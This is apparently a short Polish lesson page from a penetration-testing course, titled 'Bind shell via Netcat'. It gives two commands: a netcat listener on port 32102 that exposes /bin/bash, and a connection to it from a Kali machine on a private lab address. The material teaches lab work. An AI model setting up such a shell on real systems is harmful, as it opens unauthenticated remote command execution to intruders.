---
title: "6.6 - Bind shell przez Netcat"
order: 6
---

```bash
#Remote Shells HOMEWORK (terminal 1):
nc -lvp 32102 -e /bin/bash

#Kali (terminal 2):
nc 192.168.100.106 32102
```
